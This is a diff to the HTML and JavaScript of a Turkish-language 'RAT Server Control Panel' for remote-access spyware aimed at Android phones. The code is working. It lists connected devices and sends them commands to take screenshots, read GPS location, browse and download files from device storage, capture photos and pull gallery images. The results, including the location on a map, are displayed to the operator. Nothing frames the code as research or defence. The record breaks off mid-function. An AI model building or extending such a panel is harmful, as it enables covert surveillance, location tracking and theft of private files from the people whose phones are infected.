@@ -8,696 +8,696 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>🔧 RAT Server Control Panel</h1>
-            <div class="server-status">
-                <span class="status-indicator online"></span>
-                <span>Server Online</span>
-            </div>
-        </header>
+<div class="container">
+    <header>
+        <h1>🔧 RAT Server Control Panel</h1>
+        <div class="server-status">
+            <span class="status-indicator online"></span>
+            <span>Server Online</span>
+        </div>
+    </header>
 
-        <div class="dashboard">
-            <div class="card">
-                <h2>📊 Server İstatistikleri</h2>
-                <div class="stats">
-                    <div class="stat-item">
-                        <span class="stat-label">Bağlı Cihazlar:</span>
-                        <span class="stat-value" id="connected-count">0</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-label">Server Portu:</span>
-                        <span class="stat-value">8080</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-label">Durum:</span>
-                        <span class="stat-value status-running">Çalışıyor</span>
-                    </div>
+    <div class="dashboard">
+        <div class="card">
+            <h2>📊 Server İstatistikleri</h2>
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-label">Bağlı Cihazlar:</span>
+                    <span class="stat-value" id="connected-count">0</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Server Portu:</span>
+                    <span class="stat-value">8080</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-label">Durum:</span>
+                    <span class="stat-value status-running">Çalışıyor</span>
                 </div>
             </div>
+        </div>
 
-            <div class="card">
-                <h2>📱 Bağlı Cihazlar</h2>
-                <div class="client-list" id="client-list">
-                    <p class="no-clients">Henüz bağlı cihaz yok</p>
+        <div class="card">
+            <h2>📱 Bağlı Cihazlar</h2>
+            <div class="client-list" id="client-list">
+                <p class="no-clients">Henüz bağlı cihaz yok</p>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🎮 Komut Paneli</h2>
+            <div class="command-section">
+                <div class="client-selector">
+                    <label for="selected-client">Hedef Cihaz:</label>
+                    <select id="selected-client">
+                        <option value="">Cihaz seçin</option>
+                    </select>
+                </div>
+
+                <div class="command-buttons">
+                    <button class="btn btn-primary" onclick="takeScreenshot()">
+                        📸 Ekran Görüntüsü Al
+                    </button>
+                    <button class="btn btn-success" onclick="getLocation()">
+                        📍 Konum Bilgisi Al
+                    </button>
+                    <button class="btn btn-info" onclick="listFiles()">
+                        📁 Dosyaları Listele
+                    </button>
+                    <button class="btn btn-photo" onclick="capturePhoto()">
+                        📷 Fotoğraf Çek
+                    </button>
+                    <button class="btn btn-gallery" onclick="getGallery()">
+                        🖼️ Galeri Göster
+                    </button>
+                    <button class="btn btn-warning" onclick="refreshClients()">
+                        🔄 Cihazları Yenile
+                    </button>
                 </div>
             </div>
+        </div>
 
-            <div class="card">
-                <h2>🎮 Komut Paneli</h2>
-                <div class="command-section">
-                    <div class="client-selector">
-                        <label for="selected-client">Hedef Cihaz:</label>
-                        <select id="selected-client">
-                            <option value="">Cihaz seçin</option>
-                        </select>
-                    </div>
-                    
-                    <div class="command-buttons">
-                        <button class="btn btn-primary" onclick="takeScreenshot()">
-                            📸 Ekran Görüntüsü Al
-                        </button>
-                        <button class="btn btn-success" onclick="getLocation()">
-                            📍 Konum Bilgisi Al
-                        </button>
-                        <button class="btn btn-info" onclick="listFiles()">
-                            📁 Dosyaları Listele
-                        </button>
-                        <button class="btn btn-photo" onclick="capturePhoto()">
-                            📷 Fotoğraf Çek
-                        </button>
-                        <button class="btn btn-gallery" onclick="getGallery()">
-                            🖼️ Galeri Göster
-                        </button>
-                        <button class="btn btn-warning" onclick="refreshClients()">
-                            🔄 Cihazları Yenile
-                        </button>
-                    </div>
-                </div>
+        <div class="card results-card">
+            <h2>📋 Komut Sonuçları & Detaylar</h2>
+            <div class="results-controls">
+                <button class="btn btn-secondary" onclick="clearResults()">🗑️ Temizle</button>
+                <button class="btn btn-secondary" onclick="exportResults()">💾 Export</button>
             </div>
-
-            <div class="card results-card">
-                <h2>📋 Komut Sonuçları & Detaylar</h2>
-                <div class="results-controls">
-                    <button class="btn btn-secondary" onclick="clearResults()">🗑️ Temizle</button>
-                    <button class="btn btn-secondary" onclick="exportResults()">💾 Export</button>
-                </div>
-                <div class="results-area">
-                    <div id="results-content">
-                        <p class="no-results">Henüz komut çalıştırılmadı</p>
-                    </div>
+            <div class="results-area">
+                <div id="results-content">
+                    <p class="no-results">Henüz komut çalıştırılmadı</p>
                 </div>
             </div>
         </div>
     </div>
+</div>
 
-    <script>
-        const socket = io();
-        let clients = {};
+<script>
+    const socket = io();
+    let clients = {};
 
-        socket.on('connect', function() {
-            console.log('Admin panel connected to server');
-            refreshClients();
-        });
+    socket.on('connect', function() {
+        console.log('Admin panel connected to server');
+        refreshClients();
+    });
 
-        socket.on('screenshot_result', function(data) {
-            console.log('Screenshot result received:', data);
-            showResult('screenshot', data);
-        });
+    socket.on('screenshot_result', function(data) {
+        console.log('Screenshot result received:', data);
+        showResult('screenshot', data);
+    });
 
-        socket.on('location_result', function(data) {
-            console.log('Location result received:', data);
-            showResult('location', data);
-        });
+    socket.on('location_result', function(data) {
+        console.log('Location result received:', data);
+        showResult('location', data);
+    });
 
-        socket.on('file_list_result', function(data) {
-            console.log('File list result received:', data);
-            showResult('files', data);
-        });
+    socket.on('file_list_result', function(data) {
+        console.log('File list result received:', data);
+        showResult('files', data);
+    });
 
-        socket.on('file_download_result', function(data) {
-            console.log('File download result received:', data);
-            showResult('download', data);
-        });
+    socket.on('file_download_result', function(data) {
+        console.log('File download result received:', data);
+        showResult('download', data);
+    });
 
-        socket.on('photo_result', function(data) {
-            console.log('Photo result received:', data);
-            showResult('photo', data);
-        });
+    socket.on('photo_result', function(data) {
+        console.log('Photo result received:', data);
+        showResult('photo', data);
+    });
 
-        socket.on('gallery_photos_result', function(data) {
-            console.log('Gallery photos result received:', data);
-            showResult('gallery', data);
-        });
+    socket.on('gallery_photos_result', function(data) {
+        console.log('Gallery photos result received:', data);
+        showResult('gallery', data);
+    });
 
-        function refreshClients() {
-            fetch('/clients')
-                .then(response => response.json())
-                .then(data => {
-                    clients = data;
-                    updateClientList();
-                    updateClientSelector();
-                    updateStats();
-                })
-                .catch(error => {
-                    console.error('Error fetching clients:', error);
-                });
+    function refreshClients() {
+        fetch('/clients')
+            .then(response => response.json())
+            .then(data => {
+                clients = data;
+                updateClientList();
+                updateClientSelector();
+                updateStats();
+            })
+            .catch(error => {
+                console.error('Error fetching clients:', error);
+            });
+    }
+
+    function updateClientList() {
+        const clientList = document.getElementById('client-list');
+        if (Object.keys(clients).length === 0) {
+            clientList.innerHTML = '<p class="no-clients">Henüz bağlı cihaz yok</p>';
+            return;
         }
 
-        function updateClientList() {
-            const clientList = document.getElementById('client-list');
-            if (Object.keys(clients).length === 0) {
-                clientList.innerHTML = '<p class="no-clients">Henüz bağlı cihaz yok</p>';
-                return;
-            }
-
-            let html = '';
-            for (const [clientId, client] of Object.entries(clients)) {
-                html += `
-                    <div class="client-item">
-                        <div class="client-info">
-                            <strong>ID:</strong> ${clientId.substring(0, 8)}...
-                            <br>
-                            <strong>Bağlantı:</strong> ${new Date(client.connected_at).toLocaleString()}
-                        </div>
-                        <div class="client-status">
-                            <span class="status-indicator online"></span>
-                            Online
-                        </div>
+        let html = '';
+        for (const [clientId, client] of Object.entries(clients)) {
+            html += `
+                <div class="client-item">
+                    <div class="client-info">
+                        <strong>ID:</strong> ${clientId.substring(0, 8)}...
+                        <br>
+                        <strong>Bağlantı:</strong> ${new Date(client.connected_at).toLocaleString()}
                     </div>
-                `;
-            }
-            clientList.innerHTML = html;
-        }
-
-        function updateClientSelector() {
-            const selector = document.getElementById('selected-client');
-            selector.innerHTML = '<option value="">Cihaz seçin</option>';
-            
-            for (const [clientId, client] of Object.entries(clients)) {
-                const option = document.createElement('option');
-                option.value = clientId;
-                option.textContent = `${clientId.substring(0, 8)}... (${new Date(client.connected_at).toLocaleString()})`;
-                selector.appendChild(option);
-            }
-        }
-
-        function updateStats() {
-            document.getElementById('connected-count').textContent = Object.keys(clients).length;
-        }
-
-        function getSelectedClient() {
-            const selectedClient = document.getElementById('selected-client').value;
-            if (!selectedClient) {
-                alert('Lütfen bir cihaz seçin');
-                return null;
-            }
-            return selectedClient;
-        }
-
-        function takeScreenshot() {
-            const clientId = getSelectedClient();
-            if (!clientId) return;
-
-            fetch('/send_command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    client_id: clientId,
-                    command: 'screenshot'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                showResult('command', { message: 'Ekran görüntüsü komutu gönderildi' });
-            })
-            .catch(error => {
-                showResult('error', { message: 'Komut gönderilirken hata oluştu' });
-            });
-        }
-
-        function getLocation() {
-            const clientId = getSelectedClient();
-            if (!clientId) return;
-
-            fetch('/send_command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    client_id: clientId,
-                    command: 'location'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                showResult('command', { message: 'Konum bilgisi komutu gönderildi' });
-            })
-            .catch(error => {
-                showResult('error', { message: 'Komut gönderilirken hata oluştu' });
-            });
-        }
-
-        function listFiles() {
-            const clientId = getSelectedClient();
-            if (!clientId) return;
-
-            fetch('/send_command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    client_id: clientId,
-                    command: 'list_files',
-                    path: '/storage/emulated/0/'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                showResult('command', { message: 'Dosya listesi komutu gönderildi' });
-            })
-            .catch(error => {
-                showResult('error', { message: 'Komut gönderilirken hata oluştu' });
-            });
-        }
-
-        function capturePhoto() {
-            const clientId = getSelectedClient();
-            if (!clientId) return;
-
-            fetch('/send_command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    client_id: clientId,
-                    command: 'capture_photo'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                showResult('command', { message: 'Fotoğraf çekme komutu gönderildi' });
-            })
-            .catch(error => {
-                showResult('error', { message: 'Komut gönderilirken hata oluştu' });
-            });
-        }
-
-        function getGallery() {
-            const clientId = getSelectedClient();
-            if (!clientId) return;
-
-            fetch('/send_command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    client_id: clientId,
-                    command: 'get_gallery'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                showResult('command', { message: 'Galeri fotoğrafları komutu gönderildi' });
-            })
-            .catch(error => {
-                showResult('error', { message: 'Komut gönderilirken hata oluştu' });
-            });
-        }
-
-        function showResult(type, data) {
-            const resultsContent = document.getElementById('results-content');
-            const timestamp = new Date().toLocaleTimeString();
-            const clientId = document.getElementById('selected-client').value;
-            const clientName = clientId ? clientId.substring(0, 8) + '...' : 'Bilinmeyen';
-            
-            let html = `<div class="result-item ${type}" data-type="${type}">`;
-            html += `<div class="result-header">
-                        <span class="result-time">${timestamp}</span>
-                        <span class="result-type">${type.toUpperCase()}</span>
-                        <span class="result-client">📱 ${clientName}</span>
-                        <button class="toggle-details" onclick="toggleDetails(this)">👁️ Detaylar</button>
-                     </div>`;
-            
-            if (type === 'screenshot' && data.image_data) {
-                html += `<div class="result-summary">
-                            <span class="result-icon">📸</span>
-                            <span>Ekran görüntüsü alındı</span>
-                         </div>`;
-                html += `<div class="result-details">
-                            <div class="screenshot-container">
-                                <img src="data:image/png;base64,${data.image_data}" alt="Screenshot" class="screenshot-img" onclick="openImageModal(this)">
-                                <div class="screenshot-info">
-                                    <p>📏 Boyut: ${Math.round(data.image_data.length * 0.75 / 1024)} KB</p>
-                                    <p>🕐 Çekim zamanı: ${timestamp}</p>
-                                </div>
-                            </div>
-                         </div>`;
-            } else if (type === 'location' && (data.latitude || data.error)) {
-                const hasValidLocation = data.latitude && data.latitude !== 0;
-                const isError = data.error || !hasValidLocation;
-                
-                html += `<div class="result-summary">
-                            <span class="result-icon">${isError ? '❌' : '📍'}</span>
-                            <span>${isError ? 'Konum alınamadı' : 'Konum bilgisi alındı'}</span>
-                         </div>`;
-                html += `<div class="result-details">
-                            <div class="location-info">`;
-                
-                if (isError) {
-                    html += `<div class="location-error">
-                                <p><strong>❌ Hata:</strong> ${data.error || 'Konum servisi kapalı veya izin verilmemiş'}</p>
-                                <p><strong>💡 Çözüm önerileri:</strong></p>
-                                <ul>
-                                    <li>Cihazda GPS/Konum servisini açın</li>
-                                    <li>Uygulamaya konum izni verin</li>
-                                    <li>Cihazı açık alanda test edin</li>
-                                    <li>Google Play Services güncel mi kontrol edin</li>
-                                </ul>
-                             </div>`;
-                } else {
-                    html += `<div class="location-coords">
-                                <p><strong>📍 Enlem:</strong> ${data.latitude}</p>
-                                <p><strong>📍 Boylam:</strong> ${data.longitude}</p>
-                                <p><strong>🎯 Hassasiyet:</strong> ${data.accuracy || 'Bilinmiyor'} metre</p>
-                                ${data.note ? `<p><strong>ℹ️ Not:</strong> ${data.note}</p>` : ''}
-                             </div>
-                             <div class="location-map">
-                                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1000!2d${data.longitude}!3d${data.latitude}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zM!5e0!3m2!1str!2str!4v1234567890" 
-                                        width="100%" height="300" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
-                             </div>
-                             <div class="location-actions">
-                                <button class="btn btn-mini" onclick="copyCoordinates('${data.latitude}', '${data.longitude}')">📋 Koordinatları Kopyala</button>
-                                <button class="btn btn-mini" onclick="openInMaps('${data.latitude}', '${data.longitude}')">🗺️ Haritalarda Aç</button>
-                             </div>`;
-                }
-                
-                html += `       </div>
-                         </div>`;
-            } else if (type === 'files' && data.files) {
-                const fileCount = data.files.length;
-                const folders = data.files.filter(f => f.is_directory).length;
-                const files = fileCount - folders;
-                
-                html += `<div class="result-summary">
-                            <span class="result-icon">📁</span>
-                            <span>${fileCount} öğe listelendi (${files} dosya, ${folders} klasör)</span>
-                         </div>`;
-                html += `<div class="result-details">
-                            <div class="files-container">
-                                <div class="files-stats">
-                                    <div class="stat-card">
-                                        <span class="stat-number">${fileCount}</span>
-                                        <span class="stat-label">Toplam Öğe</span>
-                                    </div>
-                                    <div class="stat-card">
-                                        <span class="stat-number">${files}</span>
-                                        <span class="stat-label">Dosya</span>
-                                    </div>
-                                    <div class="stat-card">
-                                        <span class="stat-number">${folders}</span>
-                                        <span class="stat-label">Klasör</span>
-                                    </div>
-                                </div>
-                                <div class="files-search">
-                                    <input type="text" placeholder="Dosya ara..." onkeyup="searchFiles(this, '${Date.now()}')">
-                                </div>
-                                <div class="files-list" id="files-list-${Date.now()}">`;
-                
-                data.files.forEach((file, index) => {
-                    const isFolder = file.is_directory;
-                    const fileName = file.name;
-                    const fileSize = file.size ? formatFileSize(file.size) : '-';
-                    const icon = isFolder ? '📁' : getFileIcon(fileName);
-                    const fileType = isFolder ? 'Klasör' : getFileType(fileName);
-                    
-                    html += `<div class="file-item ${isFolder ? 'folder' : 'file'}">
-                                <span class="file-icon">${icon}</span>
-                                <div class="file-info">
-                                    <span class="file-name">${fileName}</span>
-                                    <span class="file-size">${fileSize}</span>
-                                </div>
-                                <span class="file-type">${fileType}</span>
-                                <button class="btn btn-mini" onclick="downloadFile('${file.path}')">⬇️</button>
-                             </div>`;
-                });
-                
-                html += `       </div>
-                            </div>
-                         </div>`;
-            } else if (type === 'download' && data.file_data) {
-                html += `<div class="result-summary">
-                            <span class="result-icon">⬇️</span>
-                            <span>Dosya indirildi: ${data.filename}</span>
-                         </div>`;
-                html += `<div class="result-details">
-                            <div class="download-info">
-                                <p><strong>📄 Dosya Adı:</strong> ${data.filename}</p>
-                                <p><strong>📏 Boyut:</strong> ${Math.round(data.file_data.length * 0.75 / 1024)} KB</p>
-                                <button class="btn btn-success" onclick="downloadToDevice('${data.filename}', '${data.file_data}')">💾 Bilgisayara İndir</button>
-                            </div>
-                         </div>`;
-            } else if (type === 'photo' && data.error) {
-                html += `<div class="result-summary">
-                            <span class="result-icon">📷</span>
-                            <span>Fotoğraf çekme yanıtı</span>
-                         </div>`;
-                html += `<div class="result-details">
-                            <div class="photo-error">
-                                <p><strong>❌ Bilgi:</strong> ${data.error}</p>
-                                <p><strong>💡 Öneri:</strong> ${data.suggestion || 'Galeri fotoğraflarını görüntülemek için "Galeri Göster" butonunu kullanın'}</p>
-                            </div>
-                         </div>`;
-            } else if (type === 'gallery' && data.photos) {
-                const photoCount = data.photos.length;
-                html += `<div class="result-summary">
-                            <span class="result-icon">🖼️</span>
-                            <span>${photoCount} fotoğraf bulundu</span>
-                         </div>`;
-                html += `<div class="result-details">
-                            <div class="gallery-container">
-                                <div class="gallery-stats">
-                                    <p><strong>📊 Toplam Fotoğraf:</strong> ${photoCount}</p>
-                                    <p><strong>ℹ️ Not:</strong> Son 5 fotoğraf gösteriliyor</p>
-                                </div>
-                                <div class="gallery-grid">`;
-                
-                data.photos.forEach((photo, index) => {
-                    const fileSize = Math.round(photo.data.length * 0.75 / 1024);
-                    const dateAdded = new Date(photo.date_added * 1000).toLocaleString();
-                    
-                    html += `<div class="gallery-item">
-                                <div class="gallery-image">
-                                    <img src="data:image/jpeg;base64,${photo.data}" alt="${photo.name}" onclick="openImageModal(this)">
-                                </div>
-                                <div class="gallery-info">
-                                    <p class="photo-name">${photo.name}</p>
-                                    <p class="photo-size">${fileSize} KB</p>
-                                    <p class="photo-date">${dateAdded}</p>
-                                    <div class="photo-actions">
-                                        <button class="btn btn-mini" onclick="downloadPhotoToDevice('${photo.name}', '${photo.data}')">💾 İndir</button>
-                                        <button class="btn btn-mini" onclick="copyPhotoInfo('${photo.name}', '${photo.path}')">📋 Bilgi</button>
-                                    </div>
-                                </div>
-                             </div>`;
-                });
-                
-                html += `       </div>
-                            </div>
-                         </div>`;
-            } else {
-                html += `<div class="result-summary">
-                            <span class="result-icon">💬</span>
-                            <span>${data.message || 'Komut yanıtı'}</span>
-                         </div>`;
-                html += `<div class="result-details">
-                            <div class="json-container">
-                                <pre class="json-content">${JSON.stringify(data, null, 2)}</pre>
-                            </div>
-                         </div>`;
-            }
-            
-            html += `</div>`;
-            
-            if (resultsContent.innerHTML.includes('no-results')) {
-                resultsContent.innerHTML = html;
-            } else {
-                resultsContent.innerHTML = html + resultsContent.innerHTML;
-            }
-        }
-
-        function toggleDetails(button) {
-            const resultItem = button.closest('.result-item');
-            const details = resultItem.querySelector('.result-details');
-            
-            if (details.style.display === 'none' || !details.style.display) {
-                details.style.display = 'block';
-                button.innerHTML = '👁️ Gizle';
-                button.classList.add('active');
-            } else {
-                details.style.display = 'none';
-                button.innerHTML = '👁️ Detaylar';
-                button.classList.remove('active');
-            }
-        }
-
-        function getFileIcon(filename) {
-            const ext = filename.split('.').pop().toLowerCase();
-            const icons = {
-                'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️',
-                'mp4': '🎬', 'avi': '🎬', 'mov': '🎬',
-                'mp3': '🎵', 'wav': '🎵', 'flac': '🎵',
-                'pdf': '📄', 'doc': '📄', 'docx': '📄',
-                'txt': '📝', 'log': '📝',
-                'apk': '📦', 'zip': '📦', 'rar': '📦',
-                'exe': '⚙️', 'msi': '⚙️'
-            };
-            return icons[ext] || '📄';
-        }
-
-        function getFileType(filename) {
-            const ext = filename.split('.').pop().toLowerCase();
-            const types = {
-                'jpg': 'Görsel', 'jpeg': 'Görsel', 'png': 'Görsel', 'gif': 'Görsel',
-                'mp4': 'Video', 'avi': 'Video', 'mov': 'Video',
-                'mp3': 'Ses', 'wav': 'Ses', 'flac': 'Ses',
-                'pdf': 'Belge', 'doc': 'Belge', 'docx': 'Belge',
-                'txt': 'Metin', 'log': 'Log',
-                'apk': 'Uygulama', 'zip': 'Arşiv', 'rar': 'Arşiv'
-            };
-            return types[ext] || 'Dosya';
-        }
-
-        function formatFileSize(bytes) {
-            if (bytes === 0) return '0 B';
-            const k = 1024;
-            const sizes = ['B', 'KB', 'MB', 'GB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-        }
-
-        function searchFiles(input, listId) {
-            const searchTerm = input.value.toLowerCase();
-            const filesList = document.getElementById('files-list-' + listId);
-            const items = filesList.querySelectorAll('.file-item');
-            
-            items.forEach(item => {
-                const fileName = item.querySelector('.file-name').textContent.toLowerCase();
-                if (fileName.includes(searchTerm)) {
-                    item.style.display = 'flex';
-                } else {
-                    item.style.display = 'none';
-                }
-            });
-        }
-
-        function copyCoordinates(lat, lon) {
-            navigator.clipboard.writeText(`${lat}, ${lon}`);
-            alert('Koordinatlar kopyalandı!');
-        }
-
-        function openInMaps(lat, lon) {
-            window.open(`https://www.google.com/maps?q=${lat},${lon}`, '_blank');
-        }
-
-        function openImageModal(img) {
-            const modal = document.createElement('div');
-            modal.className = 'image-modal';
-            modal.innerHTML = `
-                <div class="modal-content">
-                    <span class="close" onclick="this.parentElement.parentElement.remove()">&times;</span>
-                    <img src="${img.src}" alt="Screenshot" class="modal-image">
+                    <div class="client-status">
+                        <span class="status-indicator online"></span>
+                        Online
+                    </div>
                 </div>
             `;
-            document.body.appendChild(modal);
         }
+        clientList.innerHTML = html;
+    }
 
-        function downloadFile(filename) {
-            const clientId = getSelectedClient();
-            if (!clientId) return;
+    function updateClientSelector() {
+        const selector = document.getElementById('selected-client');
+        selector.innerHTML = '<option value="">Cihaz seçin</option>';
 
-            fetch('/send_command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    client_id: clientId,
-                    command: 'download_file',
-                    filepath: filename
-                })
+        for (const [clientId, client] of Object.entries(clients)) {
+            const option = document.createElement('option');
+            option.value = clientId;
+            option.textContent = `${clientId.substring(0, 8)}... (${new Date(client.connected_at).toLocaleString()})`;
+            selector.appendChild(option);
+        }
+    }
+
+    function updateStats() {
+        document.getElementById('connected-count').textContent = Object.keys(clients).length;
+    }
+
+    function getSelectedClient() {
+        const selectedClient = document.getElementById('selected-client').value;
+        if (!selectedClient) {
+            alert('Lütfen bir cihaz seçin');
+            return null;
+        }
+        return selectedClient;
+    }
+
+    function takeScreenshot() {
+        const clientId = getSelectedClient();
+        if (!clientId) return;
+
+        fetch('/send_command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                client_id: clientId,
+                command: 'screenshot'
             })
-            .then(response => response.json())
-            .then(data => {
-                showResult('command', { message: `"${filename}" dosyası indiriliyor...` });
-            });
-        }
+        })
+        .then(response => response.json())
+        .then(data => {
+            showResult('command', { message: 'Ekran görüntüsü komutu gönderildi' });
+        })
+        .catch(error => {
+            showResult('error', { message: 'Komut gönderilirken hata oluştu' });
+        });
+    }
 
-        function clearResults() {
-            if (confirm('Tüm sonuçları temizlemek istediğinizden emin misiniz?')) {
-                document.getElementById('results-content').innerHTML = '<p class="no-results">Henüz komut çalıştırılmadı</p>';
+    function getLocation() {
+        const clientId = getSelectedClient();
+        if (!clientId) return;
+
+        fetch('/send_command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                client_id: clientId,
+                command: 'location'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            showResult('command', { message: 'Konum bilgisi komutu gönderildi' });
+        })
+        .catch(error => {
+            showResult('error', { message: 'Komut gönderilirken hata oluştu' });
+        });
+    }
+
+    function listFiles() {
+        const clientId = getSelectedClient();
+        if (!clientId) return;
+
+        fetch('/send_command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                client_id: clientId,
+                command: 'list_files',
+                path: '/storage/emulated/0/'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            showResult('command', { message: 'Dosya listesi komutu gönderildi' });
+        })
+        .catch(error => {
+            showResult('error', { message: 'Komut gönderilirken hata oluştu' });
+        });
+    }
+
+    function capturePhoto() {
+        const clientId = getSelectedClient();
+        if (!clientId) return;
+
+        fetch('/send_command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                client_id: clientId,
+                command: 'capture_photo'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            showResult('command', { message: 'Fotoğraf çekme komutu gönderildi' });
+        })
+        .catch(error => {
+            showResult('error', { message: 'Komut gönderilirken hata oluştu' });
+        });
+    }
+
+    function getGallery() {
+        const clientId = getSelectedClient();
+        if (!clientId) return;
+
+        fetch('/send_command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                client_id: clientId,
+                command: 'get_gallery'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            showResult('command', { message: 'Galeri fotoğrafları komutu gönderildi' });
+        })
+        .catch(error => {
+            showResult('error', { message: 'Komut gönderilirken hata oluştu' });
+        });
+    }
+
+    function showResult(type, data) {
+        const resultsContent = document.getElementById('results-content');
+        const timestamp = new Date().toLocaleTimeString();
+        const clientId = document.getElementById('selected-client').value;
+        const clientName = clientId ? clientId.substring(0, 8) + '...' : 'Bilinmeyen';
+
+        let html = `<div class="result-item ${type}" data-type="${type}">`;
+        html += `<div class="result-header">
+                    <span class="result-time">${timestamp}</span>
+                    <span class="result-type">${type.toUpperCase()}</span>
+                    <span class="result-client">📱 ${clientName}</span>
+                    <button class="toggle-details" onclick="toggleDetails(this)">👁️ Detaylar</button>
+                 </div>`;
+
+        if (type === 'screenshot' && data.image_data) {
+            html += `<div class="result-summary">
+                        <span class="result-icon">📸</span>
+                        <span>Ekran görüntüsü alındı</span>
+                     </div>`;
+            html += `<div class="result-details">
+                        <div class="screenshot-container">
+                            <img src="data:image/png;base64,${data.image_data}" alt="Screenshot" class="screenshot-img" onclick="openImageModal(this)">
+                            <div class="screenshot-info">
+                                <p>📏 Boyut: ${Math.round(data.image_data.length * 0.75 / 1024)} KB</p>
+                                <p>🕐 Çekim zamanı: ${timestamp}</p>
+                            </div>
+                        </div>
+                     </div>`;
+        } else if (type === 'location' && (data.latitude || data.error)) {
+            const hasValidLocation = data.latitude && data.latitude !== 0;
+            const isError = data.error || !hasValidLocation;
+
+            html += `<div class="result-summary">
+                        <span class="result-icon">${isError ? '❌' : '📍'}</span>
+                        <span>${isError ? 'Konum alınamadı' : 'Konum bilgisi alındı'}</span>
+                     </div>`;
+            html += `<div class="result-details">
+                        <div class="location-info">`;
+
+            if (isError) {
+                html += `<div class="location-error">
+                            <p><strong>❌ Hata:</strong> ${data.error || 'Konum servisi kapalı veya izin verilmemiş'}</p>
+                            <p><strong>💡 Çözüm önerileri:</strong></p>
+                            <ul>
+                                <li>Cihazda GPS/Konum servisini açın</li>
+                                <li>Uygulamaya konum izni verin</li>
+                                <li>Cihazı açık alanda test edin</li>
+                                <li>Google Play Services güncel mi kontrol edin</li>
+                            </ul>
+                         </div>`;
+            } else {
+                html += `<div class="location-coords">
+                            <p><strong>📍 Enlem:</strong> ${data.latitude}</p>
+                            <p><strong>📍 Boylam:</strong> ${data.longitude}</p>
+                            <p><strong>🎯 Hassasiyet:</strong> ${data.accuracy || 'Bilinmiyor'} metre</p>
+                            ${data.note ? `<p><strong>ℹ️ Not:</strong> ${data.note}</p>` : ''}
+                         </div>
+                         <div class="location-map">
+                            <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1000!2d${data.longitude}!3d${data.latitude}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zM!5e0!3m2!1str!2str!4v1234567890"
+                                    width="100%" height="300" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+                         </div>
+                         <div class="location-actions">
+                            <button class="btn btn-mini" onclick="copyCoordinates('${data.latitude}', '${data.longitude}')">📋 Koordinatları Kopyala</button>
+                            <button class="btn btn-mini" onclick="openInMaps('${data.latitude}', '${data.longitude}')">🗺️ Haritalarda Aç</button>
+                         </div>`;
             }
+
+            html += `       </div>
+                     </div>`;
+        } else if (type === 'files' && data.files) {
+            const fileCount = data.files.length;
+            const folders = data.files.filter(f => f.is_directory).length;
+            const files = fileCount - folders;
+
+            html += `<div class="result-summary">
+                        <span class="result-icon">📁</span>
+                        <span>${fileCount} öğe listelendi (${files} dosya, ${folders} klasör)</span>
+                     </div>`;
+            html += `<div class="result-details">
+                        <div class="files-container">
+                            <div class="files-stats">
+                                <div class="stat-card">
+                                    <span class="stat-number">${fileCount}</span>
+                                    <span class="stat-label">Toplam Öğe</span>
+                                </div>
+                                <div class="stat-card">
+                                    <span class="stat-number">${files}</span>
+                                    <span class="stat-label">Dosya</span>
+                                </div>
+                                <div class="stat-card">
+                                    <span class="stat-number">${folders}</span>
+                                    <span class="stat-label">Klasör</span>
+                                </div>
+                            </div>
+                            <div class="files-search">
+                                <input type="text" placeholder="Dosya ara..." onkeyup="searchFiles(this, '${Date.now()}')">
+                            </div>
+                            <div class="files-list" id="files-list-${Date.now()}">`;
+
+            data.files.forEach((file, index) => {
+                const isFolder = file.is_directory;
+                const fileName = file.name;
+                const fileSize = file.size ? formatFileSize(file.size) : '-';
+                const icon = isFolder ? '📁' : getFileIcon(fileName);
+                const fileType = isFolder ? 'Klasör' : getFileType(fileName);
+
+                html += `<div class="file-item ${isFolder ? 'folder' : 'file'}">
+                            <span class="file-icon">${icon}</span>
